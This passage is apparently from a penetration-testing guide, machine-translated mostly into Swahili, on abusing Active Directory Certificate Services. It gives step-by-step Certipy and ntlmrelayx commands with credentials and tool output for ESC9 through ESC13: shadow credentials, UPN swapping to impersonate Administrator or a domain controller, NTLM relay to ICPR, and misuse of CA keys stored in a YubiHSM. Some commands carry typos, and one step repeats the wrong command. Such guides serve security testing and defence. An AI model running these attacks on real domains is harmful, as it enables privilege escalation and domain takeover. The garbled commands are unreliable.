# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

Ombi la cheti linafanywa na Certipy kwa default kulingana na kigezo `Machine` au `User`, kinachotambulika kwa kuangalia kama jina la akaunti inayopitishwa linaishia na `$`. Mwelekeo wa kigezo mbadala unaweza kufikiwa kupitia matumizi ya parameter `-template`.

Teknolojia kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kisha kutumika kulazimisha uthibitishaji. Wakati wa kushughulika na wasimamizi wa kikoa, mwelekeo wa `-template DomainController` unahitajika.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) kwa **`msPKI-Enrollment-Flag`**, inayoitwa ESC9, inazuia kuingizwa kwa **nyongeza ya usalama mpya `szOID_NTDS_CA_SECURITY_EXT`** katika cheti. Bendera hii inakuwa muhimu wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `1` (mipangilio ya kawaida), ambayo inapingana na mipangilio ya `2`. Umuhimu wake unazidi katika hali ambapo ramani dhaifu ya cheti kwa Kerberos au Schannel inaweza kutumika (kama katika ESC10), kwa kuwa ukosefu wa ESC9 haugeuzi mahitaji.

Masharti ambayo mipangilio ya bendera hii inakuwa muhimu ni pamoja na:

* `StrongCertificateBindingEnforcement` haijarekebishwa kuwa `2` (ikiwa mipangilio ya kawaida ni `1`), au `CertificateMappingMethods` inajumuisha bendera ya `UPN`.
* Cheti kimewekwa alama na bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya mipangilio ya `msPKI-Enrollment-Flag`.
* EKU yoyote ya uthibitishaji wa mteja imeainishwa na cheti.
* Ruhusa za `GenericWrite` zinapatikana juu ya akaunti yoyote ili kuathiri nyingine.

### Abuse Scenario

Fikiria `John@corp.local` ana ruhusa za `GenericWrite` juu ya `Jane@corp.local`, kwa lengo la kuathiri `Administrator@corp.local`. Kigezo cha cheti cha `ESC9`, ambacho `Jane@corp.local` anaruhusiwa kujiandikisha, kimewekwa na bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` katika mipangilio yake ya `msPKI-Enrollment-Flag`.

Kwanza, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, shukrani kwa `GenericWrite` ya `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Hivyo, `Jane`'s `userPrincipalName` inabadilishwa kuwa `Administrator`, ikikusudia kuacha sehemu ya `@corp.local` ya kikoa:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hii marekebisho hayakiuka vikwazo, kwa kuwa `Administrator@corp.local` inabaki kuwa tofauti kama `Administrator`'s `userPrincipalName`.

Baada ya hii, kiolezo cha cheti `ESC9`, kilichotajwa kuwa hatarini, kinahitajika kama `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Imepangwa kwamba `userPrincipalName` wa cheti unarejelea `Administrator`, bila “object SID” yoyote.

`Jane`'s `userPrincipalName` inarudishwa kwa yake ya awali, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kujaribu uthibitisho na cheti kilichotolewa sasa kunatoa NT hash ya `Administrator@corp.local`. Amri lazima ijumuisha `-domain <domain>` kutokana na ukosefu wa maelezo ya kikoa katika cheti:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Explanation

Two registry key values on the domain controller are referred to by ESC10:

* The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
* The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.

**Case 1**

When `StrongCertificateBindingEnforcement` is configured as `0`.

**Case 2**

If `CertificateMappingMethods` includes the `UPN` bit (`0x4`).

### Abuse Case 1

With `StrongCertificateBindingEnforcement` configured as `0`, an account A with `GenericWrite` permissions can be exploited to compromise any account B.

For instance, having `GenericWrite` permissions over `Jane@corp.local`, an attacker aims to compromise `Administrator@corp.local`. The procedure mirrors ESC9, allowing any certificate template to be utilized.

Initially, `Jane`'s hash is retrieved using Shadow Credentials, exploiting the `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Hivyo, `Jane`'s `userPrincipalName` inabadilishwa kuwa `Administrator`, kwa makusudi ikiacha sehemu ya `@corp.local` ili kuepuka uvunjaji wa kizuizi.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Kufuata hili, cheti kinachowezesha uthibitishaji wa mteja kinahitajika kama `Jane`, kwa kutumia kigezo cha `User` kilichowekwa chaguomsingi.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` inarudishwa kwa asili yake, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kuthibitisha na cheti kilichopatikana kutatoa NT hash ya `Administrator@corp.local`, ikihitaji kuweka jina la eneo katika amri kutokana na ukosefu wa maelezo ya eneo katika cheti.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

Ikiwa `CertificateMappingMethods` ina bendera ya `UPN` (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza kuathiri akaunti yoyote B isiyo na mali ya `userPrincipalName`, ikiwa ni pamoja na akaunti za mashine na msimamizi wa ndani wa domain `Administrator`.

Hapa, lengo ni kuathiri `DC$@corp.local`, kuanzia na kupata hash ya `Jane` kupitia Shadow Credentials, ikitumia `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'s `userPrincipalName` kisha inawekwa kuwa `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
A certificate for client authentication is requested as `Jane` using the default `User` template.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` inarudi kwenye asili yake baada ya mchakato huu.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Ili kuthibitisha kupitia Schannel, chaguo la `-ldap-shell` la Certipy linatumika, likionyesha mafanikio ya uthibitishaji kama `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kupitia shell ya LDAP, amri kama `set_rbcd` zinawezesha mashambulizi ya Resource-Based Constrained Delegation (RBCD), ambayo yanaweza kuhatarisha udhibiti wa kikoa.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Hii udhaifu pia inahusisha akaunti yoyote ya mtumiaji isiyo na `userPrincipalName` au ambapo haifanani na `sAMAccountName`, huku `Administrator@corp.local` ikiwa lengo kuu kutokana na haki zake za juu za LDAP na ukosefu wa `userPrincipalName` kwa kawaida.

## Relaying NTLM to ICPR - ESC11

### Maelezo

Ikiwa CA Server haijasanidiwa na `IF_ENFORCEENCRYPTICERTREQUEST`, inaweza kufanya mashambulizi ya NTLM relay bila kusaini kupitia huduma ya RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Unaweza kutumia `certipy` kuorodhesha ikiwa `Enforce Encryption for Requests` imezimwa na certipy itaonyesha udhaifu wa `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Inahitajika kuweka seva ya relay:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Note: Kwa wasimamizi wa eneo, lazima tuweke `-template` katika DomainController.

Au kutumia [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Wasimamizi wanaweza kuanzisha Mamlaka ya Cheti ili kuihifadhi kwenye kifaa cha nje kama "Yubico YubiHSM2".

Ikiwa kifaa cha USB kimeunganishwa na seva ya CA kupitia bandari ya USB, au seva ya kifaa cha USB katika kesi ambapo seva ya CA ni mashine ya virtual, funguo ya uthibitishaji (wakati mwingine inaitwa "nenosiri") inahitajika kwa Mtoa Huduma wa Hifadhi ya Funguo ili kuunda na kutumia funguo katika YubiHSM.

Funguo/hifadhi hii inahifadhiwa katika rejista chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` kwa maandiko wazi.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Ikiwa funguo ya faragha ya CA imehifadhiwa kwenye kifaa cha USB cha kimwili wakati umepata ufikiaji wa shell, inawezekana kurejesha funguo hiyo.

Kwanza, unahitaji kupata cheti cha CA (hii ni ya umma) na kisha:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finally, tumia amri ya certutil `-sign` kuunda cheti kipya cha kiholela kwa kutumia cheti cha CA na funguo zake za faragha.

## OID Group Link Abuse - ESC13

### Maelezo

Sifa ya `msPKI-Certificate-Policy` inaruhusu sera ya utoaji kuongezwa kwenye kiolezo cha cheti. Vitu vya `msPKI-Enterprise-Oid` vinavyohusika na utoaji wa sera vinaweza kupatikana katika Muktadha wa Ujumbe wa Mipangilio (CN=OID,CN=Public Key Services,CN=Services) wa kontena la PKI OID. Sera inaweza kuunganishwa na kundi la AD kwa kutumia sifa ya `msDS-OIDToGroupLink` ya kitu hiki, ikiruhusu mfumo kumthibitisha mtumiaji anayeleta cheti kana kwamba yeye ni mwanachama wa kundi hilo. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Kwa maneno mengine, wakati mtumiaji ana ruhusa ya kujiandikisha kwa cheti na cheti kimeunganishwa na kundi la OID, mtumiaji anaweza kurithi haki za kundi hili.

Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kupata OIDToGroupLink:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

Pata ruhusa ya mtumiaji ambayo inaweza kutumia `certipy find` au `Certify.exe find /showAllPermissions`.

Ikiwa `John` ana ruhusa ya kujiandikisha `VulnerableTemplate`, mtumiaji anaweza kurithi haki za kundi la `VulnerableGroup`.

Yote yanahitaji kufanya ni kubaini kiolezo, itapata cheti chenye haki za OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Kupata Miti kwa Vyeti Iliyofafanuliwa kwa Sauti ya K passive

### Kuvunjika kwa Imani za Miti na CAs Zilizoshindwa

Mipangilio ya **kujiandikisha kwa msitu wa kuvuka** imefanywa kuwa rahisi. **Cheti cha CA cha mzizi** kutoka kwa msitu wa rasilimali kinachapishwa kwa **misitu ya akaunti** na wasimamizi, na **vyeti vya CA ya biashara** kutoka kwa msitu wa rasilimali vinongezwa kwenye **`NTAuthCertificates` na AIA containers katika kila msitu wa akaunti**. Ili kufafanua, mpangilio huu unampa **CA katika msitu wa rasilimali udhibiti kamili** juu ya misitu mingine yote ambayo inasimamia PKI. Ikiwa CA hii itashindwa na washambuliaji, vyeti vya watumiaji wote katika misitu ya rasilimali na akaunti vinaweza **kuundwa na wao**, hivyo kuvunja mpaka wa usalama wa msitu.

### Haki za Kujiandikisha Zinazotolewa kwa Wakuu wa Kigeni

Katika mazingira ya misitu mingi, tahadhari inahitajika kuhusu CAs za Biashara ambazo **zinachapisha mifano ya vyeti** ambayo inaruhusu **Watumiaji Waliothibitishwa au wakuu wa kigeni** (watumiaji/vikundi vya nje ya msitu ambao CA ya Biashara inamiliki) **haki za kujiandikisha na kuhariri**.\
Baada ya uthibitisho kupitia imani, **SID ya Watumiaji Waliothibitishwa** inaongezwa kwenye token ya mtumiaji na AD. Hivyo, ikiwa kikoa kina CA ya Biashara yenye mfano ambao **unaruhusu haki za kujiandikisha kwa Watumiaji Waliothibitishwa**, mfano unaweza kujiandikisha na mtumiaji kutoka msitu tofauti. Vivyo hivyo, ikiwa **haki za kujiandikisha zinatolewa wazi kwa mkuu wa kigeni na mfano**, **uhusiano wa udhibiti wa ufikiaji wa msitu wa kuvuka unaundwa**, ukimwezesha mkuu kutoka msitu mmoja **kujiandikisha katika mfano kutoka msitu mwingine**.

Mifano yote inasababisha **kuongezeka kwa uso wa shambulio** kutoka msitu mmoja hadi mwingine. Mipangilio ya mfano wa cheti inaweza kutumika na mshambuliaji kupata haki za ziada katika kikoa cha kigeni.
